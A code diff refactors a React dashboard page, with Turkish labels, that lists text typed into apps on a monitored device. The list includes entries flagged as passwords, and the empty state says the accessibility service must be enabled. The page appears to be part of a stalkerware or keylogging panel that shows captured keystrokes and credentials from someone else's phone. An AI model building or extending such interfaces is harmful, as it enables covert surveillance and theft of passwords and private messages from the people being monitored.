@@ -1,70 +1,60 @@
 'use client';
 
-import { useEffect, useState } from 'react';
-import { api, InputLogItem, Device, formatDate } from '@/lib/api';
+import { Suspense } from 'react';
+import { api, InputLogItem, formatDate } from '@/lib/api';
+import { useDevicePage } from '@/hooks/useDevicePage';
+import { PageShell } from '@/components/ui/PageShell';
+import { TableSkeleton } from '@/components/ui/LoadingSkeleton';
 
-export default function InputsPage() {
-  const [devices, setDevices] = useState<Device[]>([]);
-  const [selectedDevice, setSelectedDevice] = useState('');
-  const [entries, setEntries] = useState<InputLogItem[]>([]);
-  const [loading, setLoading] = useState(true);
-
-  useEffect(() => {
-    api.getDevices().then((d) => {
-      setDevices(d);
-      setSelectedDevice(d[0]?.id || '');
-    });
-  }, []);
-
-  useEffect(() => {
-    if (!selectedDevice) { setLoading(false); return; }
-    setLoading(true);
-    api.getInputLogs(selectedDevice).then(setEntries).finally(() => setLoading(false));
-  }, [selectedDevice]);
+function InputsContent() {
+  const page = useDevicePage<InputLogItem>(api.getInputLogs);
 
   return (
-    <div>
-      <h1 className="text-2xl font-bold mb-2">Yazılan Metinler</h1>
-      <p className="text-sm text-gray-500 mb-6">Uygulamalara girilen metinler, şifreler ve adresler</p>
-      {devices.length > 0 && (
-        <select className="input mb-6 max-w-xs" value={selectedDevice} onChange={(e) => setSelectedDevice(e.target.value)}>
-          {devices.map((d) => <option key={d.id} value={d.id}>{d.deviceName}</option>)}
-        </select>
-      )}
-      {loading ? (
-        <div className="animate-pulse text-gray-500">Yükleniyor...</div>
-      ) : entries.length === 0 ? (
-        <div className="card text-gray-500">Kayıt yok</div>
-      ) : (
-        <div className="card overflow-hidden p-0">
-          <table className="w-full text-sm">
-            <thead className="bg-gray-50 border-b">
-              <tr>
-                <th className="text-left p-4">Uygulama</th>
-                <th className="text-left p-4">Alan</th>
-                <th className="text-left p-4">Metin</th>
-                <th className="text-left p-4">Tür</th>
-                <th className="text-left p-4">Tarih</th>
+    <PageShell
+      title="Yazılan Metinler"
+      subtitle="Uygulamalara girilen metinler ve şifreler"
+      emptyTitle="Kayıt yok"
+      emptyHint="Erişilebilirlik servisi açık olmalı."
+      isEmpty={page.data.length === 0}
+      skeleton={<TableSkeleton />}
+      {...page}
+    >
+      <div className="data-table-wrap">
+        <table className="data-table min-w-[640px]">
+          <thead>
+            <tr>
+              <th>Uygulama</th>
+              <th>Alan</th>
+              <th>Metin</th>
+              <th>Tür</th>
+              <th>Tarih</th>
+            </tr>
+          </thead>
+          <tbody>
+            {page.data.map((e) => (
+              <tr key={e.id}>
+                <td>{e.appName || e.appPackage}</td>
+                <td className="text-gray-500">{e.fieldName || '-'}</td>
+                <td className="font-mono text-xs break-all max-w-[200px]">{e.text}</td>
+                <td>
+                  <span className={e.isPasswordField ? 'badge-red' : 'badge-gray'}>
+                    {e.isPasswordField ? 'Şifre' : 'Metin'}
+                  </span>
+                </td>
+                <td className="text-gray-500 whitespace-nowrap">{formatDate(e.timestamp)}</td>
               </tr>
-            </thead>
-            <tbody>
-              {entries.map((e) => (
-                <tr key={e.id} className="border-b last:border-0">
-                  <td className="p-4">{e.appName || e.appPackage}</td>
-                  <td className="p-4 text-gray-500">{e.fieldName || '-'}</td>
-                  <td className="p-4 font-mono break-all">{e.text}</td>
-                  <td className="p-4">
-                    <span className={e.isPasswordField ? 'badge-red' : 'badge-gray'}>
-                      {e.isPasswordField ? 'Şifre' : 'Metin'}
-                    </span>
-                  </td>
-                  <td className="p-4 text-gray-500">{formatDate(e.timestamp)}</td>
-                </tr>
-              ))}
-            </tbody>
-          </table>
-        </div>
-      )}
-    </div>
+            ))}
+          </tbody>
+        </table>
+      </div>
+    </PageShell>
+  );
+}
+
+export default function InputsPage() {
+  return (
+    <Suspense fallback={<TableSkeleton />}>
+      <InputsContent />
+    </Suspense>
   );
 }
